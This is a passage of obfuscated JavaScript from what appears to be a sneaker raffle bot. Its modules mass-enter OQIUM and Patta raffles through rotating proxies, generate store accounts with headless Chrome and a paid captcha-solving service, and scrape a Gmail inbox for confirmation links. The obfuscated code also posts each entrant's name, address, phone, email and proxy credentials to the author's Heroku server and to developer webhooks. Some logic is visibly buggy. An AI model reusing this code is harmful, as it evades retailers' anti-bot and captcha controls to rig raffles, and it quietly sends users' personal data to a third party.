                                    }], _0x1af1d2 = { 'embeds': _0x253471 }, _0x31c709 = _0xaf1e66['data'], _0x31c709['data']['attributes']['email'] = '' + _0x2f8d38[_0x432e22]['Email'];
                                    if (_0x2f8d38[_0x432e22]['Size'] == 'RANDOM') {
                                    }
                                    _0x31c709['data']['attributes']['properties']['$first_name'] = '' + _0x2f8d38[_0x432e22]['FirstName'], _0x31c709['data']['attributes']['properties']['$last_name'] = '' + _0x2f8d38[_0x432e22]['LastName'], _0x31c709['data']['attributes']['properties']['$address1'] = _0x2f8d38[_0x432e22]['Address1'] + '\x20' + _0x2f8d38[_0x432e22]['Address2'] + '\x20' + _0x2f8d38[_0x432e22]['HouseNumber'], _0x31c709['data']['attributes']['properties']['$zip'] = '' + _0x2f8d38[_0x432e22]['Zip'], _0x31c709['data']['attributes']['properties']['$city'] = '' + _0x2f8d38[_0x432e22]['City'], _0x31c709['data']['attributes']['properties']['$country'] = '' + _0x2f8d38[_0x432e22]['Country'], _0x2f8d38[_0x432e22]['Size'] == 'RANDOM' ? _0x31c709['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x536c24[_0x1fa55e] : _0x31c709['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2f8d38[_0x432e22]['Size'], _0x31c709['data']['attributes']['properties']['$phone_number'] = '' + _0x2f8d38[_0x432e22]['Phone'], _0x31c709['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2f8d38[_0x432e22]['Follower'];
                                }
                                if (_0x343742['useRandomProxy'] = ![])
                                    var _0x5c0935 = _0x4327f6[_0x432e22]['split'](':');
                                else
                                    var _0xf23572 = Math['round'](Math['random']() * (_0x4327f6['length'] - 0x1)), _0x5c0935 = _0x4327f6[_0xf23572]['split'](':');
                                var _0x35ab8f = {
                                    'jar': _0x30822e,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xaf1e66['url'],
                                    'headers': _0xaf1e66['headers'],
                                    'body': JSON['stringify'](_0x31c709),
                                    'proxy': 'http://' + _0x5c0935[0x2] + ':' + _0x5c0935[0x3] + '@' + _0x5c0935[0x0] + ':' + _0x5c0935[0x1]
                                };
                                return _0x2ceb4d != 'ver' && (_0x35ab8f['url'] = _0xaf1e66['url'], _0x35ab8f['headers'] = _0xaf1e66['headers']), _0x2ceb4d == 'ver' && (_0x35ab8f['method'] = 'GET'), new Promise(function (_0x1f6585, _0x5d0eb2) {
                                    callback = async (_0x45dd1e, _0x5a68fd, _0x2ad61b) => {
                                        if (!_0x45dd1e && _0x5a68fd['statusCode'] == 0xca || !_0x45dd1e && _0x5a68fd['statusCode'] == 0xc8) {
                                            if (_0x2ceb4d != 'ver') {
                                                var _0x3dbc2e = await _0xe75614(_0x2f8d38[_0x432e22], _0xaf1e66, 'dev', ![]), _0xb118d5 = await _0xe75614(_0x2f8d38[_0x432e22], _0xaf1e66, 'pub', ![]);
                                                const _0x2713ef = {
                                                    'succesDEVMSG': { 'embeds': [_0x3dbc2e] },
                                                    'succesPUBMSG': { 'embeds': [_0xb118d5] }
                                                };
                                                let _0x3db15e = _0x2f8d38[_0x432e22];
                                                try {
                                                    prxdata = {
                                                        'username': _0x1b66d2['replace']('#', ''),
                                                        'module': _0xaf1e66['name'],
                                                        'entrydata': JSON['stringify'](_0x3db15e),
                                                        'proxy': '' + _0x4327f6[_0x432e22]
                                                    };
                                                    var _0x506843 = JSON['stringify'](prxdata);
                                                    let _0x58bbff = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x506843, _0x58bbff);
                                                } catch (_0x513be8) {
                                                }
                                                if (_0x343742['webhook'] != undefined && _0x343742['webhook'] != '')
                                                    try {
                                                        await _0x3c4b04(_0x343742['webhook'], _0x2713ef['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x2713ef['succesDEVMSG']), await _0x4aaa24(0xc8);
                                                try {
                                                    await _0x3c4b04(_0x510dd4, _0x2713ef['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3265a5(_0x2f8d38[_0x432e22], _0xaf1e66);
                                            }
                                            _0xdf700a--, _0x1f6585(console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0xaf1e66['name'] + ']\x20Task\x20' + (_0x432e22 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2ceb4d != 'ver') {
                                                var _0x28dede = '' + _0x45dd1e, _0x289e03 = await _0xe75614(_0x2f8d38[_0x432e22], _0xaf1e66, 'dev', !![], _0x28dede), _0x515ef7 = {};
                                                _0x515ef7['errorDEV'] = { 'embeds': [_0x289e03] }, _0x5d0cd0(_0x2f8d38[_0x432e22], _0xaf1e66), _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x515ef7['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x515ef7['errorDEV']);
                                            }
                                            _0xdf700a--, _0x5d0eb2(console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0xaf1e66['name'] + ']\x20Task\x20' + (_0x432e22 + 0x1) + ':\x20' + _0x45dd1e)));
                                        }
                                    };
                                    try {
                                        _0x2ceb4d != 'ver' && console['log'](_0x15e32e() + '\x20[' + _0xaf1e66['name'] + ']\x20Task\x20' + (_0x432e22 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x31c709['data']['attributes']['email']), _0x954c28(_0x35ab8f, callback);
                                    } catch (_0x325b64) {
                                        console['log'](_0x15e32e() + '\x20Task\x20' + (_0x432e22 + 0x1) + ':\x20' + _0x325b64);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5abd41(_0x3fa5d1, 'nor', _0x4cc108, _0xe0e56d, _0x539d9a), console['log'](_0x15e32e() + '\x20[' + _0x4cc108['name'] + ']\x20Sleeping\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                            } catch (_0x2520fa) {
                            }
                        }
                        _0x4823eb(_0xef34f6, _0x2277ea, _0xb68e67, _0x10bd79), await _0x4aaa24(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x462737, _0x1b5359, _0x4a0015) {
                    var _0x1b5359 = [], _0x4b80de = ![];
                    async function _0x3f6b0c() {
                        var _0x2a95c7 = new _0x5a0913({
                            'user': _0x343742['masterMail'],
                            'password': _0x343742['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5cae7a(_0x3a3018) {
                            _0x2a95c7['openBox']('INBOX', ![], _0x3a3018);
                        }
                        _0x2a95c7['once']('ready', function () {
                            _0x5cae7a(function (_0x5eb16f, _0x8e6943) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5eb16f)
                                    throw _0x5eb16f;
                                _0x2a95c7['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x169481, _0x52d666) {
                                    if (!_0x52d666 || !_0x52d666['length'])
                                        console['log'](_0x15e32e() + '\x20[' + _0x462737['name'] + ']\x20No\x20mails\x20found'), _0x2a95c7['end']();
                                    else {
                                        var _0x267a4f = _0x2a95c7['seq']['fetch'](_0x52d666, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x267a4f['on']('message', function (_0x3cb5df, _0x465130) {
                                            var _0x5296a5 = '(#' + _0x465130 + ')\x20';
                                            _0x3cb5df['on']('body', function (_0x8e1769, _0x4808d7) {
                                                _0x57117f(_0x8e1769, (_0x3d4cad, _0x3205b0) => {
                                                    var _0x43ce5c = _0x3205b0['text']['split']('(')[0x1], _0x1fe513 = _0x43ce5c['split'](')')[0x0];
                                                    _0x1b5359['push'](_0x1fe513);
                                                });
                                            }), _0x3cb5df['once']('end', function () {
                                            });
                                        }), _0x267a4f['once']('error', function (_0x54adc0) {
                                            console['log']('Fetch\x20error:\x20' + _0x54adc0), _0x4b80de = !![];
                                        }), _0x267a4f['once']('end', function () {
                                            _0x2a95c7['end'](), _0x4b80de = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x2a95c7['once']('error', function (_0x9aabed) {
                            console['log'](_0x9aabed), _0x4b80de = !![];
                        }), _0x2a95c7['once']('end', async function () {
                            _0x4b80de = !![];
                        }), _0x2a95c7['connect']();
                    }
                    async function _0x550726(_0x2d97bc, _0x2674ba, _0xdf18eb) {
                        for (var _0x43fc0f = 0x0; _0x43fc0f < _0x2674ba['length']; _0x43fc0f++) {
                            async function _0x2c8b3c(_0x1ba485, _0x4e5195, _0xfbf1a5, _0x3fb771, _0x1718fb) {
                                var _0x3780a2, _0x5034f3 = {}, _0x414208 = [], _0x3219ce = {}, _0x1995b7 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x394d82 = Math['round'](Math['random']() * (_0x1995b7['length'] - 0x1));
                                _0x3fb771[_0x1ba485]['Size'] == 'RANDOM' && (_0x3fb771[_0x1ba485]['Size'] = _0x1995b7[_0x394d82]);
                                !_0x3fb771 && (_0x3fb771 = {});
                                if (_0x343742['useRandomProxy'] = ![])
                                    var _0xd93532 = _0x1718fb[_0x1ba485]['split'](':');
                                else
                                    var _0x7fafd = Math['round'](Math['random']() * (_0x1718fb['length'] - 0x1)), _0xd93532 = _0x1718fb[_0x7fafd]['split'](':');
                                var _0x519cb9 = {
                                    'jar': _0x30822e,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xfbf1a5['url'],
                                    'headers': _0xfbf1a5['headers'],
                                    'body': JSON['stringify'](_0x5034f3),
                                    'proxy': 'http://' + _0xd93532[0x2] + ':' + _0xd93532[0x3] + '@' + _0xd93532[0x0] + ':' + _0xd93532[0x1]
                                };
                                return _0x4e5195 != 'ver' && (_0x519cb9['url'] = _0xfbf1a5['url'], _0x519cb9['headers'] = _0xfbf1a5['headers']), _0x4e5195 == 'ver' && (_0x519cb9['method'] = 'GET', _0x519cb9['url'] = _0x3fb771[_0x1ba485]), new Promise(function (_0x5c5066, _0x30afc4) {
                                    callback = async (_0x5359aa, _0xc8986a, _0x14e05b) => {
                                        if (!_0x5359aa && _0xc8986a['statusCode'] == 0xca || !_0x5359aa && _0xc8986a['statusCode'] == 0xc8) {
                                            if (_0x4e5195 != 'ver') {
                                                var _0x1b3268 = await _0xe75614(_0x3fb771[_0x1ba485], _0xfbf1a5, 'dev', ![]), _0x4433dc = await _0xe75614(_0x3fb771[_0x1ba485], _0xfbf1a5, 'pub', ![]);
                                                const _0x3b7307 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1b3268] },
                                                    'succesPUBMSG': { 'embeds': [_0x4433dc] }
                                                };
                                                if (_0x343742['webhook'] != undefined && _0x343742['webhook'] != '')
                                                    try {
                                                        await _0x3c4b04(_0x343742['webhook'], _0x3b7307['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x3b7307['succesDEVMSG']), await _0x4aaa24(0xc8);
                                                try {
                                                    await _0x3c4b04(_0x510dd4, _0x3b7307['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3265a5(_0x3fb771[_0x1ba485], _0xfbf1a5);
                                            }
                                            _0x5c5066(console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0xfbf1a5['name'] + ']\x20Task\x20' + (_0x1ba485 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4e5195 != 'ver') {
                                                var _0x130df7 = '' + _0x5359aa, _0x4c0182 = await _0xe75614(_0x3fb771[_0x1ba485], _0xfbf1a5, 'dev', !![], _0x130df7), _0x50d02d = {};
                                                _0x50d02d['errorDEV'] = { 'embeds': [_0x4c0182] }, _0x5d0cd0(_0x3fb771[_0x1ba485], _0xfbf1a5), _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x50d02d['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x50d02d['errorDEV']);
                                            }
                                            _0x30afc4(console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0xfbf1a5['name'] + ']\x20Task\x20' + (_0x1ba485 + 0x1) + ':\x20' + _0x5359aa)));
                                        }
                                    };
                                    try {
                                        _0x4e5195 != 'ver' ? console['log'](_0x15e32e() + '\x20[' + _0xfbf1a5['name'] + ']\x20Task\x20' + (_0x1ba485 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5034f3['data']['attributes']['email']) : console['log'](_0x15e32e() + '\x20[' + _0xfbf1a5['name'] + ']\x20Task\x20' + (_0x1ba485 + 0x1) + ':\x20Fetching\x20Response'), _0x954c28(_0x519cb9, callback);
                                    } catch (_0xd7e8f4) {
                                        console['log'](_0x15e32e() + '\x20Task\x20' + (_0x1ba485 + 0x1) + ':\x20' + _0xd7e8f4);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2c8b3c(_0x43fc0f, 'ver', _0x2d97bc, _0x2674ba, _0xdf18eb), console['log'](_0x15e32e() + '\x20[' + _0x2d97bc['name'] + ']\x20Sleeping\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                            } catch (_0x4a945b) {
                            }
                        }
                    }
                    try {
                        _0x3f6b0c();
                        while (!_0x4b80de) {
                            await _0x4aaa24(0xfa0);
                        }
                        console['log']('Found\x20' + _0x1b5359['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x550726(_0x462737, _0x1b5359, _0x4a0015);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x1aae59, _0xfbbea0, _0x5e56fc) {
                    _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x343742['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x23a325 = 0x0; _0x23a325 < _0xfbbea0['length']; _0x23a325++) {
                        var _0x20181d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1b66d2
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x343742['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3c97e2
                                }
                            ]
                        }];
                        const _0x57d249 = { 'embeds': _0x20181d };
                        _0x5c2a2f(_0x1aae59['name'] + '\x20Task\x20' + (_0x23a325 + 0x1) + '\x20/\x20' + _0xfbbea0['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                        try {
                            await _0x10409e(_0xfbbea0, _0x23a325);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x3badec = await _0xe75614(_0xfbbea0[_0x23a325], _0x1aae59, 'acc', ![]);
                        const _0x36629c = { 'succesDEVMSG': { 'embeds': [_0x3badec] } };
                        if (_0xfbbea0[_0x23a325]['Email'] == '' || _0xfbbea0[_0x23a325]['FirstName'] == '' || _0xfbbea0[_0x23a325]['LastName'] == '') {
                            console['log'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x23a325 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4aaa24(0x7d0);
                            continue;
                        }
                        (_0xfbbea0[_0x23a325]['Password'] == '' || _0xfbbea0[_0x23a325] == undefined) && _0xfbbea0[_0x23a325]['Password'] == 'JRaffles23!';
                        if (_0x343742['useRandomProxy'] = ![])
                            var _0x3c0c57 = _0x5e56fc[_0x23a325]['split'](':');
                        else
                            var _0x12b385 = Math['round'](Math['random']() * (_0x5e56fc['length'] - 0x1)), _0x3c0c57 = _0x5e56fc[_0x12b385]['split'](':');
                        var _0x4423fc;
                        try {
                            _0x4423fc = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c0c57[0x0] + ':' + _0x3c0c57[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4423fc = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c0c57[0x0] + ':' + _0x3c0c57[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x39acef = await _0x4423fc['newPage']();
                            await _0x39acef['authenticate']({
                                'username': '' + _0x3c0c57[0x2],
                                'password': '' + _0x3c0c57[0x3]
                            }), console['log'](_0x15e32e() + '\x20[' + _0x1aae59['name'] + ']\x20Task\x20' + (_0x23a325 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x39acef['setRequestInterception'](!![]), _0x39acef['on']('request', _0x3b43f4 => {
                                _0x3b43f4['resourceType']() === 'image' || _0x3b43f4['resourceType']() === 'font' || _0x3b43f4['resourceType']() === 'media' ? _0x3b43f4['abort']() : _0x3b43f4['continue']();
                            }), await _0x39acef['goto']('https://patta.nl/account/register'), await _0x4aaa24(0xbb8), await _0x39acef['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x15e32e() + '\x20[' + _0x1aae59['name'] + ']\x20Task\x20' + (_0x23a325 + 0x1) + '\x20:\x20Filling\x20information'), await _0x39acef['type']('#RegisterForm-FirstName', '' + _0xfbbea0[_0x23a325]['FirstName']), await _0x4aaa24(0x226), await _0x39acef['type']('#RegisterForm-LastName', '' + _0xfbbea0[_0x23a325]['LastName']), await _0x4aaa24(0x226), await _0x39acef['type']('#RegisterForm-email', '' + _0xfbbea0[_0x23a325]['Email']), await _0x4aaa24(0x226), await _0x39acef['type']('#RegisterForm-password', '' + _0xfbbea0[_0x23a325]['Password']), await _0x4aaa24(0x226), console['log'](_0x15e32e() + '\x20[' + _0x1aae59['name'] + ']\x20Task\x20' + (_0x23a325 + 0x1) + '\x20:\x20Submitting..'), await _0x39acef['$eval']('#RegisterForm', _0x5575c0 => _0x5575c0['submit']()), await _0x4aaa24(0x1f40);
                            try {
                                await _0x39acef['waitForSelector']('.home-page-grid__collection'), await _0x4aaa24(0x1f4), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x1aae59['name'] + ']\x20Task\x20' + (_0x23a325 + 0x1) + '\x20:\x20Account\x20' + _0xfbbea0[_0x23a325]['Email'] + '\x20Generated!')), _0x343ecd['appendFileSync']('../accounts/patta.csv', '\x0a' + _0xfbbea0[_0x23a325]['Email'] + ',' + _0xfbbea0[_0x23a325]['Password']), console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x1aae59['name'] + ']\x20Task\x20' + (_0x23a325 + 0x1) + '\x20:\x20Account\x20' + _0xfbbea0[_0x23a325]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x36629c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3c4b04(_0x435bee, _0x36629c['succesDEVMSG']);
                            } catch (_0x326cc9) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x23a325 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x326cc9));
                            }
                        } catch (_0x474cb4) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x23a325 + 0x1) + '\x20:\x20' + _0x474cb4));
                        } finally {
                            _0x4423fc && _0x4423fc['close'](), console['log']('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x13ad37, _0x2aeadd, _0x3837c6) {
                    _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x343742['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x12525c = 0x0; _0x12525c < _0x2aeadd['length']; _0x12525c++) {
                        var _0x358098;
                        if (_0x2ad909 != 'yes')
                            var _0x2ad909 = '', _0x3443b9 = 0x0;
                        _0x5c2a2f(_0x13ad37['name'] + '\x20Task\x20' + (_0x12525c + 0x1) + '\x20/\x20' + _0x2aeadd['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                        try {
                            await _0x10409e(_0x2aeadd, _0x12525c);
                        } catch {
                            _0x2ad909 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x2aeadd[_0x12525c]['Email'] == '' || _0x2aeadd[_0x12525c]['Password'] == '' || _0x2aeadd[_0x12525c]['FirstName'] == '' || _0x2aeadd[_0x12525c]['LastName'] == '') {
                            console['log'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x343742['useRandomProxy'] = ![])
                            var _0x4e45da = _0x3837c6[_0x12525c]['split'](':');
                        else
                            var _0x34f19c = Math['round'](Math['random']() * (_0x3837c6['length'] - 0x1)), _0x4e45da = _0x3837c6[_0x34f19c]['split'](':');
                        var _0xd9fcf4;
                        try {
                            _0xd9fcf4 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e45da[0x0] + ':' + _0x4e45da[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xd9fcf4 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e45da[0x0] + ':' + _0x4e45da[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4bc542 = await _0xd9fcf4['newPage']();
                            await _0x4bc542['authenticate']({
                                'username': '' + _0x4e45da[0x2],
                                'password': '' + _0x4e45da[0x3]
                            }), console['log'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4bc542['setRequestInterception'](!![]), _0x4bc542['on']('request', _0x544a21 => {
                                _0x544a21['resourceType']() === 'image' || _0x544a21['resourceType']() === 'font' || _0x544a21['resourceType']() === 'media' ? _0x544a21['abort']() : _0x544a21['continue']();
                            }), await _0x4bc542['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4bc542['waitForSelector']('#CustomerEmail'), console['log'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4bc542['type']('#CustomerEmail', '' + _0x2aeadd[_0x12525c]['Email']), await _0x4aaa24(0x12c), await _0x4bc542['type']('#CustomerPassword', '' + _0x2aeadd[_0x12525c]['Password']), await _0x4aaa24(0x226), await _0x4bc542['$eval']('#customer_login', _0x58cb03 => _0x58cb03['submit']());
                            try {
                                await _0x4bc542['waitForSelector']('#orders'), await _0x4aaa24(0x4b0);
                            } catch {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4bc542['goto']('' + _0x2aeadd[_0x12525c]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4aaa24(0xbb8), console['log'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4bc542['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x4bc542['type']('#email', '' + _0x2aeadd[_0x12525c]['Email']), await _0x4aaa24(0x384), await _0x4bc542['type']('#first_name', '' + _0x2aeadd[_0x12525c]['FirstName']), await _0x4aaa24(0x514), await _0x4bc542['type']('#last_name', '' + _0x2aeadd[_0x12525c]['LastName']), await _0x4aaa24(0x514), await _0x4bc542['type']('#street_address', _0x2aeadd[_0x12525c]['Address1'] + '\x20' + _0x2aeadd[_0x12525c]['HouseNumber'] + '\x20' + _0x2aeadd[_0x12525c]['Address2']), await _0x4aaa24(0x2bc);
                            _0x2aeadd[_0x12525c]['Postcode'] == undefined && (_0x2aeadd[_0x12525c]['Postcode'] = _0x2aeadd[_0x12525c]['Zip']);
                            await _0x4bc542['type']('#zip_code', '' + _0x2aeadd[_0x12525c]['Postcode']), await _0x4aaa24(0x320), await _0x4bc542['type']('#city', '' + _0x2aeadd[_0x12525c]['City']), await _0x4aaa24(0x320), await _0x4bc542['type']('#bday', '01/01/1994'), await _0x4aaa24(0x320), await _0x4bc542['type']('#instagram', '' + _0x2aeadd[_0x12525c]['Follower']), await _0x4aaa24(0x352);
                            if (_0x2aeadd[_0x12525c]['Size'] == 'RANDOM') {
                                const _0x34f350 = await _0x4bc542['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x541013 => {
                                    return _0x541013['map'](_0x56e99f => _0x56e99f['textContent']);
                                });
                                var _0x5d4aa9 = Math['round'](Math['random']() * (_0x34f350['length'] - 0x1));
                                console['log'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x34f350[_0x5d4aa9]), await _0x4bc542['click']('label[data-eu-size=\x22' + _0x34f350[_0x5d4aa9] + '\x22]');
                            } else {
                                console['log'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x2aeadd[_0x12525c]['Size']);
                                try {
                                    await _0x4bc542['click']('label[data-eu-size=\x22' + _0x2aeadd[_0x12525c]['Size'] + '\x22]');
                                } catch {
                                    await _0x4bc542['click']('label[data-eu-size=\x22' + _0x2aeadd[_0x12525c]['Size'] + '.0\x22]');
                                }
                            }
